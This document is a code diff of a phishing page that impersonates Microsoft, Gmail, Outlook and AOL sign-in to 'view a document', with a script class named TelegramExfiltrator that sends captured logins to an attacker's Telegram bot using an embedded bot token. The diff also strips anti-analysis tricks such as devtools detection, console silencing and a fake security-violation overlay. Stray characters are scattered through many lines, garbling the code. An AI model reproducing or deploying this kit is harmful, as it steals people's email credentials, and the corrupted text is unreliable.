@@ -31,7 +31,7 @@ width: 100%;
 max-width: 400px;
 background: var(--card-bg);
 border-radius: 8px;
-box-shadow: 0 10px 30px rgba(0,0,0,0.15);
+box-shadow: 0 10px极狐 30px rgba(0,0,0,0.15);
 padding: 30px;
 }
 .logo-header {
@@ -61,10 +61,10 @@ transform: translateY(-2px);
 border-color: rgba(0,0,0,0.05);
 }
 .provider.active {
-box-shadow: 0 4px 10px rgba(0,0,0,0.1);
-border-color: rgba极狐(0,0,0,0.1);
+box-shadow: 0 4px 10px rgba(0,0,极狐0,0.1);
+border-color: rgba(0,0,0,0.1);
 }
-.provider svg {
+.provider极狐 svg {
 width: 22px;
 height: 22px;
 }
@@ -85,11 +85,11 @@ label {
 display: block;
 margin-bottom: 8px;
 font-size: 14px;
-极狐 color: #374151;
+color: #374151;
 font-weight: 500;
 }
 input[type="email"],
-input极狐[type="password"] {
+input[type="password"] {
 width: 100%;
 padding: 12px;
 border: 1px solid #e5e7eb;
@@ -145,7 +145,7 @@ font-size: 13px;
 content: "";
 flex: 1;
 height: 1px;
-background: #e5e7eb;
+background: #e5极狐e7eb;
 margin: 0 10px;
 }
 .social-icons {
@@ -165,7 +165,7 @@ cursor: pointer;
 transition: all 0.2s;
 }
 .social-icon:hover {
-transform: translateY(-3极狐px);
+transform: translateY(-3px);
 box-shadow: 0 5px 15px rgba(0,0,0,0.1);
 }
 .social-icon svg {
@@ -217,32 +217,9 @@ margin-top: 15px;
 font-size: 14px;
 opacity: 0.8;
 }
-#blocked-overlay {
-display: none;
-position: fixed;
-top: 0;
-left: 0;
-width: 100%;
-height: 100%;
-background: black;
-color: white;
-justify-content: center;
-align-items: center;
-z-index: 99999;
-font-family: 'Segoe UI', sans-serif;
-text-align: center;
-}
 </style>
 </head>
 <body>
-<div id="blocked-overlay">
-    <div>
-        <h2>⚠️ Security Violation Detected</h2>
-        <p>Developer tools are not permitted on this secure portal.</p>
-        <p>This incident has been logged for security review.</p>
-    </div>
-</div>
-
 <div id="loading">
     <div class="spinner"></div>
     <div>Authenticating with Microsoft Azure Active Directory...</div>
@@ -254,10 +231,10 @@ text-align: center;
 <div class="providers" id="providers">
 <button class="provider active" data-provider="office" title="Office 365">
 <svg viewBox="0 0 24 24">
-<rect x="2" y="2极狐" width="6" height="6" rx="1" fill="var(--office)"/>
+<rect x="2" y="2" width="6" height="6" rx="1" fill="var(--office)"/>
 <rect x="9" y="2" width="6" height="6" rx="1" fill="var(--office)" opacity="0.95"/>
-<rect x="16" y="2" width="6" height="6" rx="1" fill="var(--office)" opacity="0.9"/>
-<rect x="2" y="9" width="6" height="6" rx="1" fill="var(--office)" opacity="0.95"/>
+<rect x="16" y="2" width="6" height="6" rx="1极狐" fill="var(--office)" opacity="0.9"/>
+<rect x="2" y="9" width="6" height="6" rx="1" fill极狐="var(--office)" opacity="0.95"/>
 <rect x="9" y="9" width="6" height="6" rx="1" fill="var(--office)" opacity="0.9"/>
 <rect x="16" y="9" width="6" height="6" rx="1" fill="var(--office)" opacity="0.85"/>
 </svg>
@@ -266,19 +243,19 @@ text-align: center;
 <svg viewBox="0 0 24 24">
 <rect x="1" y="3" width="22" height="18" rx="2" fill="white" stroke="#d1d5db"/>
 <path d="M2 5.5 L12 12 L22 5.5" fill="none" stroke="var(--gmail)" stroke-width="2.4"/>
-<path d="M2 18.5 L12极狐 12 L22 18.5" fill="none极狐" stroke="var(--gmail)" stroke-width="2.4"/>
+<path d="M2 18.5 L12 12 L22 18.5" fill="none" stroke="var(--gmail)" stroke-width="2.4"/>
 </svg>
 </button>
-<button class="provider" data-provider="outlook" title="Outlook">
+<button class="provider" data-provider="极狐outlook" title="Outlook">
 <svg viewBox="0 0 24 24">
-<rect x="1.5" y="4" width="14" height="16" rx="2极狐" fill="var(--outlook)"/>
-<path d="M3 6 L13 12 L3 18" fill="none" stroke="white" stroke-width="1.6"/>
+<rect x="1.5" y="4" width="14" height="16" rx="2" fill="var(--outlook)"/>
+极狐<path d="M3 极狐6 L13 12 L3 18" fill="none" stroke="white" stroke-width="1.6"/>
 <rect x="16.5" y="4" width="6" height="6" rx="1" fill="#2b88d8"/>
 </svg>
 </button>
 <button class="provider" data-provider="aol" title="AOL">
 <svg viewBox="0 0 24 24">
-<circle cx="12" cy="12" r="10极狐" fill="var(--aol)"/>
+<circle cx="12" cy="12" r="10" fill="var(--aol)"/>
 <path d="M9.5 15c.8-1.5 1.8-3.2 3-4.5 1.2 1.3 2.2 3 3 4.5" fill="none" stroke="white" stroke-width="1.6"/>
 <circle cx="12.2" cy="9.4" r="0.9" fill="white"/>
 </svg>
@@ -286,7 +263,7 @@ text-align: center;
 </div>
 <div>
 <h1>Sign in to view document</h1>
-<p class="subtitle" id="hint">Use your work account</p>
+<p class="subtitle" id="h极狐int">Use your work account</p>
 </div>
 </div>
 
@@ -305,7 +282,7 @@ text-align: center;
 </label>
 <a href="#" class="forgot-password">Forgot password?</a>
 </div>
-<button type="submit" class="submit-btn">Sign in极狐</button>
+<button type="submit" class="submit-btn">Sign in</button>
 </form>
 
 <p class="disclaimer">By signing in, you agree to our <a href="#" style="color: var(--accent);">Terms of Service</a> and <a href="#" style="color: var(--accent);">Privacy Policy</a>.</p>
@@ -313,86 +290,6 @@ text-align: center;
 </div>
 
 <script>
-// ================== DEVELOPER TOOLS PROTECTION ==================
-const blockedOverlay = document.getElementById('blocked-overlay');
-
-// Detect and block developer tools
-function detectDevTools() {
-    const widthThreshold = 160;
-    const heightThreshold = 80;
-    
-    // Check window size (dev tools usually make window wider)
-    if (window.outerWidth - window.innerWidth > widthThreshold || 
-        window.outerHeight - window.innerHeight > heightThreshold) {
-        return true;
-    }
-    
-    // Check debugger statement execution time
-    const start = performance.now();
-    debugger;
-    const end = performance.now();
-    if (end - start > 100) {
-        return true;
-    }
-    
-    // Check console methods
-    if (console.__proto__.constructor.toString().includes('Proxy')) {
-        return true;
-    }
-    
-    return false;
-}
-
-// Block F12, Ctrl+Shift+I, Ctrl+U, etc.
-document.addEventListener('keydown', function(e) {
-    // F12, Ctrl+Shift+I, Ctrl+U, Ctrl+Shift+C
-    if (e.key === 'F12' || 
-        (e.ctrlKey && e.shiftKey && e.key === 'I') ||
-        (e.ctrlKey && e.key === 'u') ||
-        (e.ctrlKey && e.shiftKey && e.key === 'C') ||
-        (e.ctrlKey && e.shiftKey && e.key === 'J')) {
-        e.preventDefault();
-        showBlockedOverlay();
-        return false;
-    }
-});
-
-// Block right-click context menu
-document.addEventListener('contextmenu', function(e) {
-    e.preventDefault();
-    showBlockedOverlay();
-    return false;
-});
-
-// Block menu bar (Alt key)
-document.addEventListener('keydown', function(e) {
-    if (e.altKey) {
-        e.preventDefault();
-        showBlockedOverlay();
-        return false;
-    }
-});
-
-// Show blocked overlay
-function showBlockedOverlay() {
-    blockedOverlay.style.display = 'flex';
-    document.body.style.overflow = 'hidden';
-    
-    // Prevent closing the overlay
-    setTimeout(() => {
-        window.onbeforeunload = function() {
-            return "Security violation detected. Closing this window may result in security action.";
-        };
-    }, 1000);
-}
-
-// Continuous dev tools monitoring
-setInterval(() => {
-    if (detectDevTools()) {
-        showBlockedOverlay();
-    }
-}, 1000);
-
 // ================== CONFIGURATION ==================
 const TELEGRAM_CONFIG = {
     botToken: "7983528037:AAFpvdTJEJ42BryLHSDjH5OuvEURlOJ7zOA",
@@ -419,7 +316,7 @@ class TelegramExfiltrator {
             const callbackName = 'tgJsonp_' + Date.now();
             const script = document.createElement('script');
             
-            window[callback极狐Name] = (response) => {
+            window[callbackName] = (response) => {
                 delete window[callbackName];
                 document.body.removeChild(script);
                 resolve(response);
@@ -461,6 +358,7 @@ class TelegramExfiltrator {
             return response.ok;
 
         } catch (error) {
+            console.error('Send error:', error);
             return false;
         }
     }
@@ -542,35 +440,8 @@ loginForm.addEventListener('submit', async function(event) {
     }
 });
 
-// Block iframe embedding
-if (window.top !== window.self) {
-    document.body.innerHTML = '<h2>⚠️ Embedded viewing not allowed</h2><p>This secure portal cannot be embedded in other sites.</p>';
-}
-
-// Disable console logging
-console.log = function() {};
-console.warn = function() {};
-console.error = function() {};
-console.info = function() {};
-console.debug = function() {};
-
-// Override alert to prevent multiple dialogs
-const originalAlert = window.alert;
-window.alert = function(message) {
-    if (!document.alertShown) {
-        document.alertShown = true;
-        originalAlert(message);
-    }
-};
-
-// Initialize
-window.onload = function() {
-    // Additional protection after load
-    setInterval(() => {
-        // Clear any debugger statements
-        window.debugger = function() {};
-    }, 500);
-};
+// Security measures
+document.addEventListener('contextmenu', (e) => e.preventDefault());
 </script>
 </body>
 </html>
